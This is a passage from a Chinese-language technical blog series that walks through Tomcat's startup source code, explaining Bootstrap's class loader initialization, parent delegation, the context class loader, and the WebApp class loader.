class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化classloader（包括catalinaLoader），下文将具体分析</span></span><br><span class="line">    initClassLoaders();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前的线程的contextClassLoader为catalinaLoader</span></span><br><span class="line">    Thread.currentThread().setContextClassLoader(catalinaLoader);</span><br><span class="line"></span><br><span class="line">    SecurityClassLoad.securityClassLoad(catalinaLoader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过catalinaLoader加载Catalina，并初始化startupInstance 对象</span></span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">        log.debug(<span class="string">&quot;Loading startup class&quot;</span>);</span><br><span class="line">    Class&lt;?&gt; startupClass = catalinaLoader.loadClass(<span class="string">&quot;org.apache.catalina.startup.Catalina&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">startupInstance</span> <span class="operator">=</span> startupClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射调用了setParentClassLoader 方法</span></span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled())</span><br><span class="line">        log.debug(<span class="string">&quot;Setting startup class properties&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;setParentClassLoader&quot;</span>;</span><br><span class="line">    Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">    paramTypes[<span class="number">0</span>] = Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line">    Object paramValues[] = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">    paramValues[<span class="number">0</span>] = sharedLoader;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span></span><br><span class="line">        startupInstance.getClass().getMethod(methodName, paramTypes);</span><br><span class="line">    method.invoke(startupInstance, paramValues);</span><br><span class="line"></span><br><span class="line">    catalinaDaemon = startupInstance;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面几行关键代码的注释，我们就可以看出Catalina是如何初始化的。这里还留下一个问题，tomcat为什么要初始化不同的classloader呢</p>
<hr>
<h1 id="Tomcat-启动过程-类加载机制详解"><a href="#Tomcat-启动过程-类加载机制详解" class="headerlink" title="Tomcat - 启动过程:类加载机制详解"></a>Tomcat - 启动过程:类加载机制详解</h1><blockquote>
<p>上文我们讲了Tomcat在初始化时会初始化classLoader。本文将具体分析Tomcat的类加载机制，特别是区别于传统的<code>双亲委派模型</code>的加载机制。</p>
</blockquote>
<h2 id="Tomcat初始化了哪些classloader"><a href="#Tomcat初始化了哪些classloader" class="headerlink" title="# Tomcat初始化了哪些classloader"></a><a href="#tomcat%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BA%86%E5%93%AA%E4%BA%9Bclassloader">#</a> Tomcat初始化了哪些classloader</h2><p>在Bootstrap中我们可以看到有如下三个classloader</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">commonLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">catalinaLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">sharedLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<h3 id="如何初始化的呢？"><a href="#如何初始化的呢？" class="headerlink" title="# 如何初始化的呢？"></a><a href="#%E5%A6%82%E4%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96%E7%9A%84%E5%91%A2">#</a> 如何初始化的呢？</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initClassLoaders</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// commonLoader初始化</span></span><br><span class="line">        commonLoader = createClassLoader(<span class="string">&quot;common&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (commonLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// no config file, default to this loader - we might be in a &#x27;single&#x27; env.</span></span><br><span class="line">            commonLoader = <span class="built_in">this</span>.getClass().getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// catalinaLoader初始化, 父classloader是commonLoader</span></span><br><span class="line">        catalinaLoader = createClassLoader(<span class="string">&quot;server&quot;</span>, commonLoader);</span><br><span class="line">        <span class="comment">// sharedLoader初始化</span></span><br><span class="line">        sharedLoader = createClassLoader(<span class="string">&quot;shared&quot;</span>, commonLoader);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        handleThrowable(t);</span><br><span class="line">        log.error(<span class="string">&quot;Class loader creation threw exception&quot;</span>, t);</span><br><span class="line">        System.exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>可以看出，catalinaLoader 和 sharedLoader 的 parentClassLoader 是 commonLoader。</p>
</blockquote>
<h3 id="如何创建classLoader的？"><a href="#如何创建classLoader的？" class="headerlink" title="# 如何创建classLoader的？"></a><a href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAclassloader%E7%9A%84">#</a> 如何创建classLoader的？</h3><p>不妨再看下如何创建的？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ClassLoader <span class="title function_">createClassLoader</span><span class="params">(String name, ClassLoader parent)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> CatalinaProperties.getProperty(name + <span class="string">&quot;.loader&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((value == <span class="literal">null</span>) || (value.equals(<span class="string">&quot;&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> parent;</span><br><span class="line"></span><br><span class="line">    value = replace(value);</span><br><span class="line"></span><br><span class="line">    List&lt;Repository&gt; repositories = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    String[] repositoryPaths = getPaths(value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String repository : repositoryPaths) &#123;</span><br><span class="line">        <span class="comment">// Check for a JAR URL repository</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unused&quot;)</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(repository);</span><br><span class="line">            repositories.add(<span class="keyword">new</span> <span class="title class_">Repository</span>(repository, RepositoryType.URL));</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            <span class="comment">// Ignore</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Local repository</span></span><br><span class="line">        <span class="keyword">if</span> (repository.endsWith(<span class="string">&quot;*.jar&quot;</span>)) &#123;</span><br><span class="line">            repository = repository.substring</span><br><span class="line">                (<span class="number">0</span>, repository.length() - <span class="string">&quot;*.jar&quot;</span>.length());</span><br><span class="line">            repositories.add(<span class="keyword">new</span> <span class="title class_">Repository</span>(repository, RepositoryType.GLOB));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (repository.endsWith(<span class="string">&quot;.jar&quot;</span>)) &#123;</span><br><span class="line">            repositories.add(<span class="keyword">new</span> <span class="title class_">Repository</span>(repository, RepositoryType.JAR));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            repositories.add(<span class="keyword">new</span> <span class="title class_">Repository</span>(repository, RepositoryType.DIR));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ClassLoaderFactory.createClassLoader(repositories, parent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法的逻辑也比较简单就是从 catalina.property文件里找 common.loader, shared.loader, server.loader 对应的值，然后构造成Repository 列表，再将Repository 列表传入ClassLoaderFactory.createClassLoader 方法，ClassLoaderFactory.createClassLoader 返回的是 URLClassLoader，而Repository 列表就是这个URLClassLoader 可以加在的类的路径。 在catalina.property文件里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">common.loader=<span class="string">&quot;<span class="variable">$&#123;catalina.base&#125;</span>/lib&quot;</span>,<span class="string">&quot;<span class="variable">$&#123;catalina.base&#125;</span>/lib/*.jar&quot;</span>,<span class="string">&quot;<span class="variable">$&#123;catalina.home&#125;</span>/lib&quot;</span>,<span class="string">&quot;<span class="variable">$&#123;catalina.home&#125;</span>/lib/*.jar&quot;</span></span><br><span class="line">server.loader=</span><br><span class="line">shared.loader=</span><br></pre></td></tr></table></figure>

<p>其中 shared.loader, server.loader 是没有值的，createClassLoader 方法里如果没有值的话，就返回传入的 parent ClassLoader，也就是说，commonLoader,catalinaLoader,sharedLoader 其实是一个对象。在Tomcat之前的版本里，这三个是不同的URLClassLoader对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; startupClass = catalinaLoader.loadClass(<span class="string">&quot;org.apache.catalina.startup.Catalina&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">startupInstance</span> <span class="operator">=</span> startupClass.getConstructor().newInstance();</span><br></pre></td></tr></table></figure>

<p>初始化完三个ClassLoader对象后，init() 方法就使用 catalinaClassLoader 加载了org.apache.catalina.startup.Catalina 类，并创建了一个对象，然后通过反射调用这个对象的 setParentClassLoader 方法，传入的参数是 sharedClassLoader。最后吧这个 Catania 对象复制给 catalinaDaemon 属性。</p>
<h2 id="深入理解"><a href="#深入理解" class="headerlink" title="# 深入理解"></a><a href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3">#</a> 深入理解</h2><p>可以复习下类加载机制的基础：<a href>JVM基础 - Java 类加载机制</a></p>
<h3 id="什么是类加载机制"><a href="#什么是类加载机制" class="headerlink" title="# 什么是类加载机制"></a><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6">#</a> 什么是类加载机制</h3><p>Java是一门面向对象的语言，而对象又必然依托于类。类要运行，必须首先被加载到内存。我们可以简单地把类分为几类：</p>
<ul>
<li>Java自带的核心类</li>
<li>Java支持的可扩展类</li>
<li>我们自己编写的类</li>
<li><strong>为什么要设计多个类加载器</strong>？</li>
</ul>
<blockquote>
<p>如果所有的类都使用一个类加载器来加载，会出现什么问题呢？</p>
</blockquote>
<p>假如我们自己编写一个类<code>java.util.Object</code>，它的实现可能有一定的危险性或者隐藏的bug。而我们知道Java自带的核心类里面也有<code>java.util.Object</code>，如果JVM启动的时候先行加载的是我们自己编写的<code>java.util.Object</code>，那么就有可能出现安全问题！</p>
<p>所以，Sun（后被Oracle收购）采用了另外一种方式来保证最基本的、也是最核心的功能不会被破坏。你猜的没错，那就是双亲委派模式！</p>
<ul>
<li><strong>什么是双亲委派模型</strong>？</li>
</ul>
<blockquote>
<p>双亲委派模型解决了类错乱加载的问题，也设计得非常精妙。</p>
</blockquote>
<p>双亲委派模式对类加载器定义了层级，每个类加载器都有一个父类加载器。在一个类需要加载的时候，首先委派给父类加载器来加载，而父类加载器又委派给祖父类加载器来加载，以此类推。如果父类及上面的类加载器都加载不了，那么由当前类加载器来加载，并将被加载的类缓存起来。</p>
<p><img src="https://pdai.tech/images/jvm/java_jvm_classload_3.png" alt="img"></p>
<p>所以上述类是这么加载的</p>
<ul>
<li>Java自带的核心类 – 由启动类加载器加载</li>
<li>Java支持的可扩展类 – 由扩展类加载器加载</li>
<li>我们自己编写的类 – 默认由应用程序类加载器或其子类加载</li>
</ul>
<blockquote>
<p>但它也不是万能的，在有些场景也会遇到它解决不了的问题，比如如下场景。</p>
</blockquote>
<h3 id="双亲委派模型问题是如何解决的？"><a href="#双亲委派模型问题是如何解决的？" class="headerlink" title="# 双亲委派模型问题是如何解决的？"></a><a href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E9%97%AE%E9%A2%98%E6%98%AF%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E7%9A%84">#</a> 双亲委派模型问题是如何解决的？</h3><blockquote>
<p>在Java核心类里面有SPI（Service Provider Interface），它由Sun编写规范，第三方来负责实现。SPI需要用到第三方实现类。如果使用双亲委派模型，那么第三方实现类也需要放在Java核心类里面才可以，不然的话第三方实现类将不能被加载使用。但是这显然是不合理的！怎么办呢？</p>
</blockquote>
<p><strong>ContextClassLoader</strong>（上下文类加载器）就来解围了。</p>
<p>在java.lang.Thread里面有两个方法，get&#x2F;set上下文类加载器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContextClassLoader</span><span class="params">(ClassLoader cl)</span></span><br><span class="line"><span class="keyword">public</span> ClassLoader <span class="title function_">getContextClassLoader</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过在SPI类里面调用getContextClassLoader来获取第三方实现类的类加载器。由第三方实现类通过调用setContextClassLoader来传入自己实现的类加载器, 这样就变相地解决了双亲委派模式遇到的问题。</p>
<h3 id="为什么Tomcat的类加载器也不是双亲委派模型"><a href="#为什么Tomcat的类加载器也不是双亲委派模型" class="headerlink" title="# 为什么Tomcat的类加载器也不是双亲委派模型"></a><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88tomcat%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B">#</a> 为什么Tomcat的类加载器也不是双亲委派模型</h3><blockquote>
<p>我们知道，Java默认的类加载机制是通过双亲委派模型来实现的，而Tomcat实现的方式又和双亲委派模型有所区别。</p>
</blockquote>
<p><strong>原因在于一个Tomcat容器允许同时运行多个Web程序，每个Web程序依赖的类又必须是相互隔离的</strong>。因此，如果Tomcat使用双亲委派模式来加载类的话，将导致Web程序依赖的类变为共享的。</p>
<p>举个例子，假如我们有两个Web程序，一个依赖A库的1.0版本，另一个依赖A库的2.0版本，他们都使用了类xxx.xx.Clazz，其实现的逻辑因类库版本的不同而结构完全不同。那么这两个Web程序的其中一个必然因为加载的Clazz不是所使用的Clazz而出现问题！而这对于开发来说是非常致命的！</p>
<h3 id="Tomcat类加载机制是怎么样的呢"><a href="#Tomcat类加载机制是怎么样的呢" class="headerlink" title="# Tomcat类加载机制是怎么样的呢"></a><a href="#tomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E6%98%AF%E6%80%8E%E4%B9%88%E6%A0%B7%E7%9A%84%E5%91%A2">#</a> Tomcat类加载机制是怎么样的呢</h3><blockquote>
<p>既然Tomcat的类加载机器不同于双亲委派模式，那么它又是一种怎样的模式呢？</p>
</blockquote>
<p>我们在这里一定要看下官网提供的<a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-9.0-doc/class-loader-howto.html">类加载的文档在新窗口打开</a></p>
<p><img src="https://pdai.tech/images/tomcat/tomcat-x-classloader-1.png" alt="img"></p>
<p>结合经典的类加载机制，我们完整的看下Tomcat类加载图</p>
<p><img src="https://pdai.tech/images/tomcat/tomcat-x-classloader-2.png" alt="img"></p>
<p>我们在这张图中看到很多类加载器，除了Jdk自带的类加载器，我们尤其关心Tomcat自身持有的类加载器。仔细一点我们很容易发现：Catalina类加载器和Shared类加载器，他们并不是父子关系，而是兄弟关系。为啥这样设计，我们得分析一下每个类加载器的用途，才能知晓。</p>
<ul>
<li><p>Common类加载器</p>
<p>，负责加载Tomcat和Web应用都复用的类 </p>
<ul>
<li><p><strong>Catalina类加载器</strong>，负责加载Tomcat专用的类，而这些被加载的类在Web应用中将不可见</p>
</li>
<li><p>Shared类加载器</p>
<p>，负责加载Tomcat下所有的Web应用程序都复用的类，而这些被加载的类在Tomcat中将不可见 </p>
<ul>
<li><strong>WebApp类加载器</strong>，负责加载具体的某个Web应用程序所使用到的类，而这些被加载的类在Tomcat和其他的Web应用程序都将不可见</li>
<li><strong>Jsp类加载器</strong>，每个jsp页面一个类加载器，不同的jsp页面有不同的类加载器，方便实现jsp页面的热插拔</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>同样的，我们可以看到通过<strong>ContextClassLoader</strong>（上下文类加载器）的<strong>setContextClassLoader</strong>来传入自己实现的类加载器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">  initClassLoaders();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 看这里</span></span><br><span class="line">  Thread.currentThread().setContextClassLoader(catalinaLoader);</span><br><span class="line"></span><br><span class="line">  SecurityClassLoad.securityClassLoad(catalinaLoader);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="WebApp类加载器"><a href="#WebApp类加载器" class="headerlink" title="# WebApp类加载器"></a><a href="#webapp%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8">#</a> WebApp类加载器</h3><blockquote>
<p>到这儿，我们隐隐感觉到少分析了点什么！没错，就是WebApp类加载器。整个启动过程分析下来，我们仍然没有看到这个类加载器。它又是在哪儿出现的呢？</p>
</blockquote>
<p>我们知道WebApp类加载器是Web应用私有的，而每个Web应用其实算是一个Context，那么我们通过Context的实现类应该可以发现。在Tomcat中，Context的默认实现为StandardContext，我们看看这个类的startInternal()方法，在这儿我们发现了我们感兴趣的WebApp类加载器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException &#123;</span><br><span class="line">    <span class="keyword">if</span> (getLoader() == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">WebappLoader</span> <span class="variable">webappLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebappLoader</span>(getParentClassLoader());</span><br><span class="line">        webappLoader.setDelegate(getDelegate());</span><br><span class="line">        setLoader(webappLoader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>入口代码非常简单，就是webappLoader不存在的时候创建一个，并调用setLoader方法。我们接着分析setLoader</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoader</span><span class="params">(Loader loader)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Lock</span> <span class="variable">writeLock</span> <span class="operator">=</span> loaderLock.writeLock();</span><br><span class="line">    writeLock.lock();</span><br><span class="line">    <span class="type">Loader</span> <span class="variable">oldLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Change components if necessary</span></span><br><span class="line">        oldLoader = <span class="built_in">this</span>.loader;</span><br><span class="line">        <span class="keyword">if</span> (oldLoader == loader)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">this</span>.loader = loader;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stop the old component if necessary</span></span><br><span class="line">        <span class="keyword">if</span> (getState().isAvailable() &amp;&amp; (oldLoader != <span class="literal">null</span>) &amp;&amp;</span><br><span class="line">            (oldLoader <span class="keyword">instanceof</span> Lifecycle)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) oldLoader).stop();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;StandardContext.setLoader: stop: &quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Start the new component if necessary</span></span><br><span class="line">        <span class="keyword">if</span> (loader != <span class="literal">null</span>)</span><br><span class="line">            loader.setContext(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (getState().isAvailable() &amp;&amp; (loader != <span class="literal">null</span>) &amp;&amp;</span><br><span class="line">            (loader <span class="keyword">instanceof</span> Lifecycle)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) loader).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;StandardContext.setLoader: start: &quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        writeLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Report this property change to interested listeners</span></span><br><span class="line">    support.firePropertyChange(<span class="string">&quot;loader&quot;</span>, oldLoader, loader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这儿，我们感兴趣的就两行代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((Lifecycle) oldLoader).stop(); <span class="comment">// 旧的加载器停止</span></span><br><span class="line">((Lifecycle) loader).start(); <span class="comment">// 新的加载器启动</span></span><br></pre></td></tr></table></figure>

<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="# 参考文章"></a><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">#</a> 参考文章</h3><ul>
<li><a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-9.0-doc/class-loader-howto.html">https://tomcat.apache.org/tomcat-9.0-doc/class-loader-howto.html</a></li>
<li>juconcurrent <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/51b2c50c58eb">https://www.jianshu.com/p/51b2c50c58eb</a></li>
</ul>
<h1 id="Tomcat-启动过程-Catalina的加载"><a href="#Tomcat-启动过程-Catalina的加载" class="headerlink" title="Tomcat - 启动过程:Catalina的加载"></a>Tomcat - 启动过程:Catalina的加载</h1><blockquote>
<p>通过前两篇文章，我们知道了<a href>Tomcat的类加载机制</a>和<a href>整体的组件加载流程</a>；我们也知道通过Bootstrap初始化的catalinaClassLoader加载了Catalina，那么进而引入了一个问题就是Catalina是如何加载的呢？加载了什么呢？本文将带你进一步分析。</p>
</blockquote>
<h2 id="Catalina的引入"><a href="#Catalina的引入" class="headerlink" title="# Catalina的引入"></a><a href="#catalina%E7%9A%84%E5%BC%95%E5%85%A5">#</a> Catalina的引入</h2><blockquote>
<p>通过前两篇文章，我们知道了Tomcat的类加载机制和整体的组件加载流程；我们也知道通过Bootstrap初始化的catalinaClassLoader加载了Catalina，那么进而引入了一个问题就是Catalina是如何加载的呢？加载了什么呢？</p>
</blockquote>
<ul>
<li>先回顾下整个流程，和我们分析的阶段</li>
</ul>
<p><img src="https://pdai.tech/images/tomcat/tomcat-x-catalina-1.png" alt="img"></p>
<ul>
<li>看下Bootstrap中Load的过程</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 加载守护进程</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">load</span><span class="params">(String[] arguments)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the load() method</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;load&quot;</span>;</span><br><span class="line">    Object param[];</span><br><span class="line">    Class&lt;?&gt; paramTypes[];</span><br><span class="line">    <span class="keyword">if</span> (arguments==<span class="literal">null</span> || arguments.length==<span class="number">0</span>) &#123;</span><br><span class="line">        paramTypes = <span class="literal">null</span>;</span><br><span class="line">        param = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">        paramTypes[<span class="number">0</span>] = arguments.getClass();</span><br><span class="line">        param = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">        param[<span class="number">0</span>] = arguments;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span></span><br><span class="line">        catalinaDaemon.getClass().getMethod(methodName, paramTypes); </span><br><span class="line">    <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;Calling startup class &quot;</span> + method);</span><br><span class="line">    &#125;</span><br><span class="line">    method.invoke(catalinaDaemon, param);<span class="comment">// 本质上就是调用catalina的load方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Catalina的加载"><a href="#Catalina的加载" class="headerlink" title="# Catalina的加载"></a><a href="#catalina%E7%9A%84%E5%8A%A0%E8%BD%BD">#</a> Catalina的加载</h2><p>上一步，我们知道catalina load的触发，因为有参数所以是load(String[])方法。我们进而看下这个load方法做了什么？</p>
<ul>
<li>load(String[])本质上还是调用了load方法</li>
</ul>
